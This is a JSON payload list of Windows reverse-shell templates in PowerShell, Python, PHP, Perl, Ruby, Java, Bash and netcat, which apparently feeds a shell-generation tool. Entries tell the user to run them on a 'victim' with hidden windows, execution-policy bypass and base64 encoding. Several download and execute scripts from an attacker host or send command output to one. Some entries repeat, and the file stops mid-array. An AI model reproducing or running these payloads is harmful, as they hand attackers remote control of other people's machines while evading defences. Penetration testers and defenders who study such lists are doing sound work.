{
    "payloads": [
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "Basic PowerShell reverse TCP shell.",
            "template": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            "usage": "Run on victim machine. Listener: netcat or TCP listener on specified port.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive",
                "fileless",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "Encoded PowerShell reverse shell for obfuscation.",
            "template": "powershell -NoP -NonI -W Hidden -Enc {base64encodedpayload}",
            "usage": "Base64 encode the command and run on victim. Listener: netcat or PowerShell listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "encoded",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse TCP shell using built-in socket module.",
            "template": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);\"",
            "usage": "Requires Python installed. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PHP",
            "description": "PHP reverse shell executed via command line.",
            "template": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"cmd.exe -i <&3 >&3 2>&3\");'",
            "usage": "Requires PHP CLI. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "php",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Netcat",
            "description": "Netcat reverse shell using Windows nc.exe.",
            "template": "nc.exe {ip} {port} -e cmd.exe",
            "usage": "Run on victim with nc.exe present. Listener: netcat or similar TCP listener.",
            "tags": [
                "reverse_tcp",
                "netcat",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Perl",
            "description": "Perl reverse shell using socket module.",
            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"cmd.exe -i\");};'",
            "usage": "Requires Perl installed. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "perl",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Ruby",
            "description": "Ruby reverse shell using socket module.",
            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"cmd.exe -i <&%d >&%d 2>&%d\",f,f,f)'",
            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "ruby",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Java",
            "description": "Java reverse shell connecting to attacker host.",
            "template": "r = Runtime.getRuntime();p = r.exec(\"cmd.exe\");s = new Socket(\"{ip}\",{port});pi = p.getInputStream();po = p.getOutputStream();si = s.getInputStream();so = s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(p.isAlive()==false)break;}p.destroy();s.close();",
            "usage": "Run within a Java environment on victim. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "java",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "Bash",
            "description": "Windows Git Bash reverse shell using bash.",
            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "usage": "Requires Git Bash or similar installed. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "bash",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with SSL encryption.",
            "template": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$ssl = New-Object System.Net.Security.SslStream($stream,$false,({$true}));$ssl.AuthenticateAsClient('{ip}');[byte[]]$bytes = 0..65535|%{0};while(($i = $ssl.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$ssl.Write($sendbyte,0,$sendbyte.Length);$ssl.Flush()};$client.Close()",
            "usage": "Requires PowerShell. Listener must support SSL (e.g., stunnel + netcat).",
            "tags": [
                "reverse_tcp",
                "powershell",
                "ssl",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with TCP client in a single line.",
            "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"",
            "usage": "Run on victim PowerShell prompt. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that downloads and executes a script from a URL.",
            "template": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\"",
            "usage": "Victim downloads and runs script from attacker's HTTP server. Listener: PowerShell listener or netcat.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "download",
                "script"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with command obfuscation using base64 encoding.",
            "template": "powershell -EncodedCommand {base64payload}",
            "usage": "Encode full command in base64 and run on victim. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "encoded",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with command execution and socket connection.",
            "template": "python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));proc=subprocess.Popen(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());proc.wait()\"",
            "usage": "Requires Python on victim. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Netcat",
            "description": "Netcat reverse shell using -c option (if supported).",
            "template": "nc.exe -e cmd.exe {ip} {port}",
            "usage": "Run on victim with compatible nc.exe. Listener: netcat or similar.",
            "tags": [
                "reverse_tcp",
                "netcat",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "Netcat",
            "description": "Netcat reverse shell using -c alternative on some versions.",
            "template": "nc.exe {ip} {port} -e cmd.exe",
            "usage": "Run on victim with nc.exe. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "netcat",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with WScript Shell for interactive commands.",
            "template": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$shell = New-Object -ComObject WScript.Shell;while(($data = $stream.ReadByte()) -ne -1){$command = [char]$data + '';while($stream.DataAvailable){$command += [char]$stream.ReadByte()};$output = $shell.Exec($command);$writer.WriteLine($output.StdOut.ReadToEnd());$writer.Flush()}\"",
            "usage": "Requires PowerShell and WScript. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with socket and subprocess modules.",
            "template": "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe','/Q'])\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with System.Diagnostics.Process for command execution.",
            "template": "powershell -NoProfile -WindowStyle Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$proc = New-Object System.Diagnostics.Process; $proc.StartInfo.FileName = 'cmd.exe'; $proc.StartInfo.RedirectStandardInput = $true; $proc.StartInfo.RedirectStandardOutput = $true; $proc.StartInfo.UseShellExecute = $false; $proc.Start();$streamReader = New-Object System.IO.StreamReader($stream);$streamWriter = New-Object System.IO.StreamWriter($stream);while(-not $proc.HasExited){$cmd = $streamReader.ReadLine();$proc.StandardInput.WriteLine($cmd);$proc.StandardInput.Flush();$output = $proc.StandardOutput.ReadLine();$streamWriter.WriteLine($output);$streamWriter.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PHP",
            "description": "PHP reverse shell using fsockopen and cmd.exe execution.",
            "template": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"cmd.exe -i <&3 >&3 2>&3\");'",
            "usage": "Requires PHP CLI. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "php",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses Start-Process to spawn cmd.exe.",
            "template": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$buffer = New-Object Byte[] 1024;while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = ([Text.Encoding]::ASCII).GetString($buffer,0,$i);$process = Start-Process cmd.exe -ArgumentList '/c',$data -NoNewWindow -RedirectStandardOutput $stream -Wait;};$client.Close()\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses .NET TcpClient and StreamReader for communication.",
            "template": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$reader = New-Object System.IO.StreamReader($stream);$writer = New-Object System.IO.StreamWriter($stream);while(($line = $reader.ReadLine()) -ne $null){$output = (Invoke-Expression $line | Out-String);$writer.WriteLine($output);$writer.Flush()}\"",
            "usage": "Run in PowerShell with bypass. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses TCPClient and asynchronously reads/writes data.",
            "template": "powershell -NoProfile -WindowStyle Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$buffer = New-Object byte[] 1024;while(($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = ([Text.Encoding]::ASCII).GetString($buffer,0,$read);$output = (Invoke-Expression $data 2>&1 | Out-String);$outBytes = ([Text.Encoding]::ASCII).GetBytes($output);$stream.Write($outBytes,0,$outBytes.Length);$stream.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "Fileless PowerShell reverse shell using .NET TcpClient and Base64 encoding.",
            "template": "powershell -EncodedCommand {base64payload}",
            "usage": "Base64 encode the reverse shell command. Run on victim PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "encoded",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell using socket and subprocess with shell=True.",
            "template": "python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));subprocess.call('cmd.exe', shell=True, stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with TCPClient and StreamWriter to send output.",
            "template": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while(($line = $reader.ReadLine()) -ne $null){$output = (Invoke-Expression $line | Out-String);$writer.WriteLine($output);$writer.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with named pipes for communication.",
            "template": "powershell -NoProfile -Command \"$pipeName = 'mypipe';$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream $pipeName; $pipeServer.WaitForConnection();$sr = New-Object System.IO.StreamReader $pipeServer; $sw = New-Object System.IO.StreamWriter $pipeServer; while(($cmd = $sr.ReadLine()) -ne $null){$output = (Invoke-Expression $cmd 2>&1 | Out-String); $sw.WriteLine($output); $sw.Flush()}\"",
            "usage": "Requires PowerShell. Named pipes listener needed.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "named_pipes",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that connects over UDP to bypass TCP restrictions.",
            "template": "$udpclient = New-Object System.Net.Sockets.UdpClient; $udpclient.Connect('{ip}',{port}); $stream = $udpclient.Client; while($true){$data = $udpclient.Receive([ref]$remoteendpoint);$cmd = [Text.Encoding]::ASCII.GetString($data);$output = (iex $cmd 2>&1 | Out-String);$bytes = [Text.Encoding]::ASCII.GetBytes($output);$udpclient.Send($bytes, $bytes.Length)}",
            "usage": "Requires PowerShell. Listener must support UDP packets.",
            "tags": [
                "reverse_udp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with compression using GzipStream to reduce payload size.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$gzipStream = New-Object System.IO.Compression.GzipStream($stream,[IO.Compression.CompressionMode]::Decompress);$reader = New-Object System.IO.StreamReader($gzipStream);$writer = New-Object System.IO.StreamWriter($stream);while(($cmd = $reader.ReadLine()) -ne $null){$output = (Invoke-Expression $cmd 2>&1 | Out-String);$writer.WriteLine($output);$writer.Flush()}\"",
            "usage": "Run in PowerShell. Listener must send Gzip compressed commands.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "gzip",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with socket, subprocess and communication loop.",
            "template": "python -c \"import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));while True:data=s.recv(1024).decode('utf-8');proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);stdout_value=proc.stdout.read()+proc.stderr.read();s.send(stdout_value)\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses a web client to send output to attacker via HTTP POST.",
            "template": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$buffer = New-Object byte[] 1024; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $i);$output = (Invoke-Expression $data 2>&1 | Out-String);$wc = New-Object System.Net.WebClient; $wc.UploadString('http://{ip}/upload','POST',$output)}\"",
            "usage": "Run in PowerShell. Listener needs webserver to receive POST data.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "http",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PHP",
            "description": "PHP reverse shell that uses proc_open for interaction.",
            "template": "<?php $sock=fsockopen('{ip}',{port});proc_open('cmd.exe', array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>",
            "usage": "Run in PHP-capable environment. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "php",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell using Start-Process with redirected input/output.",
            "template": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();$proc=Start-Process cmd.exe -RedirectStandardInput $stream -RedirectStandardOutput $stream -NoNewWindow -PassThru;$proc.WaitForExit();$client.Close()\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses async socket reading and writing.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();while ($client.Connected) { $buffer = New-Object byte[] 1024; $read = $stream.Read($buffer, 0, $buffer.Length); if ($read -gt 0) { $command = ([Text.Encoding]::ASCII).GetString($buffer, 0, $read); $output = (Invoke-Expression $command 2>&1 | Out-String); $bytes = ([Text.Encoding]::ASCII).GetBytes($output); $stream.Write($bytes, 0, $bytes.Length); $stream.Flush() } }\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with error handling and socket connection.",
            "template": "python -c \"import socket,subprocess,os;s=socket.socket();try:s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe']);except:pass\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses System.Net.Sockets.Socket instead of TcpClient.",
            "template": "powershell -NoProfile -Command \"$socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp);$socket.Connect('{ip}',{port});$stream = New-Object System.IO.NetworkStream($socket);$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while(($line = $reader.ReadLine()) -ne $null){$output = (Invoke-Expression $line 2>&1 | Out-String);$writer.WriteLine($output);$writer.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that connects back and uses Runspace for command execution.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$sr = New-Object System.IO.StreamReader($stream);$sw = New-Object System.IO.StreamWriter($stream);$runspace = [powershell]::Create();while(($command = $sr.ReadLine()) -ne $null){$runspace.Commands.Clear();$runspace.AddScript($command) | Out-Null;$results = $runspace.Invoke();$output = $results | Out-String;$sw.WriteLine($output);$sw.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "runspace",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with socket, subprocess, and select for multiplexing.",
            "template": "python -c \"import socket,subprocess,select;s=socket.socket();s.connect(('{ip}',{port}));while True:r,w,e=select.select([s],[],[]);if s in r:data=s.recv(1024).decode('utf-8');proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);out=proc.stdout.read()+proc.stderr.read();s.send(out)\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell using System.Diagnostics.ProcessStartInfo with redirected streams.",
            "template": "powershell -NoProfile -Command \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();$procInfo=New-Object System.Diagnostics.ProcessStartInfo; $procInfo.FileName='cmd.exe';$procInfo.RedirectStandardInput=$true;$procInfo.RedirectStandardOutput=$true;$procInfo.RedirectStandardError=$true;$procInfo.UseShellExecute=$false; $proc=New-Object System.Diagnostics.Process; $proc.StartInfo=$procInfo; $proc.Start() | Out-Null; $sw=New-Object System.IO.StreamWriter($stream); $sr=New-Object System.IO.StreamReader($stream); while(-not $proc.HasExited) { if($sr.Peek() -ge 0) { $cmd = $sr.ReadLine(); $proc.StandardInput.WriteLine($cmd); $proc.StandardInput.Flush() } $out = $proc.StandardOutput.ReadToEnd(); if($out) { $sw.WriteLine($out); $sw.Flush() } }\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PHP",
            "description": "PHP reverse shell using proc_open with socket connection.",
            "template": "<?php $sock=fsockopen('{ip}',{port});proc_open('cmd.exe',array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>",
            "usage": "Run in PHP-capable environment. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "php",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with encryption using AES.",
            "template": "powershell -NoProfile -Command \"$key = [System.Text.Encoding]::ASCII.GetBytes('0123456789abcdef');$aes = New-Object System.Security.Cryptography.AesManaged;$aes.Key = $key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();$encryptor = $aes.CreateEncryptor();$decryptor = $aes.CreateDecryptor();$buffer = New-Object byte[] 1024; while(($read = $stream.Read($buffer,0,$buffer.Length)) -ne 0) { $decrypted = $decryptor.TransformFinalBlock($buffer,0,$read); $command = [System.Text.Encoding]::ASCII.GetString($decrypted); $output = (Invoke-Expression $command 2>&1 | Out-String); $encrypted = $encryptor.TransformFinalBlock(([System.Text.Encoding]::ASCII).GetBytes($output),0,$output.Length); $stream.Write($encrypted,0,$encrypted.Length); $stream.Flush() }\"",
            "usage": "Run in PowerShell. Listener must encrypt/decrypt with same key.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "aes",
                "encrypted",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell using Invoke-Expression from Base64 string.",
            "template": "powershell -EncodedCommand {base64payload}",
            "usage": "Encode full payload in base64 and run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "encoded",
                "fileless"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that downloads and executes a script from HTTPS URL.",
            "template": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://{ip}/shell.ps1')\"",
            "usage": "Victim downloads and runs script from attacker's HTTPS server. Listener: PowerShell listener or netcat.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "download",
                "script"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with socket and subprocess on one line.",
            "template": "python -c \"import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));subprocess.call(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"",
            "usage": "Requires Python installed. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive",
                "one-liner"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with TCP client, continuously reads commands.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();while($true){$buffer = New-Object byte[] 1024;$read = $stream.Read($buffer, 0, $buffer.Length);if ($read -le 0) {break};$command = ([Text.Encoding]::ASCII).GetString($buffer, 0, $read);$output = (Invoke-Expression $command 2>&1 | Out-String);$bytes = ([Text.Encoding]::ASCII).GetBytes($output);$stream.Write($bytes, 0, $bytes.Length);$stream.Flush()}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "Python",
            "description": "Python reverse shell with socket, subprocess, and inline execution.",
            "template": "python -c \"import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));proc=subprocess.Popen('cmd.exe',shell=True,stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());proc.wait()\"",
            "usage": "Requires Python. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "python",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that downloads and executes a base64 encoded command from a URL.",
            "template": "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/payload.b64') | ForEach-Object {[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($_)) | Invoke-Expression}\"",
            "usage": "Victim downloads base64 payload from HTTP server and executes it. Listener: PowerShell listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "download",
                "encoded"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that connects back and executes commands asynchronously.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();while($client.Connected){$buffer = New-Object byte[] 1024;$read = $stream.Read($buffer,0,$buffer.Length);if($read -gt 0){$command = ([Text.Encoding]::ASCII).GetString($buffer,0,$read);$output = (Invoke-Expression $command 2>&1 | Out-String);$bytes = ([Text.Encoding]::ASCII).GetBytes($output);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()}}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "async",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PHP",
            "description": "PHP reverse shell using shell_exec and fsockopen.",
            "template": "<?php $sock=fsockopen('{ip}',{port});while($cmd=fgets($sock)){echo shell_exec($cmd);}?>",
            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "php",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell that uses background jobs for command execution.",
            "template": "powershell -NoProfile -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();Start-Job -ScriptBlock {while($true){$buffer = New-Object byte[] 1024;$read = $stream.Read($buffer, 0, $buffer.Length);if($read -le 0) {break};$command = ([Text.Encoding]::ASCII).GetString($buffer, 0, $read);$output = (Invoke-Expression $command 2>&1 | Out-String);$bytes = ([Text.Encoding]::ASCII).GetBytes($output);$stream.Write($bytes, 0, $bytes.Length);$stream.Flush()}}\"",
            "usage": "Run in PowerShell. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "background_job",
                "interactive"
            ]
        },
        {
            "os": "Windows",
            "language": "PowerShell",
            "description": "PowerShell reverse shell with dynamic port and IP from environment variables.",
            "template": "powershell -NoProfile -Command \"$ip = $env:IP; $port = $env:PORT; $client = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $client.GetStream();while($true){$buffer = New-Object byte[] 1024;$read = $stream.Read($buffer,0,$buffer.Length);if($read -le 0){break};$command = ([Text.Encoding]::ASCII).GetString($buffer,0,$read);$output = (Invoke-Expression $command 2>&1 | Out-String);$bytes = ([Text.Encoding]::ASCII).GetBytes($output);$stream.Write($bytes,0,$bytes.Length);$stream.Flush()}\"",
            "usage": "Set environment variables IP and PORT before running. Listener: netcat or TCP listener.",
            "tags": [
                "reverse_tcp",
                "powershell",
                "env_variables",
                "interactive"
            ]
        },
        {
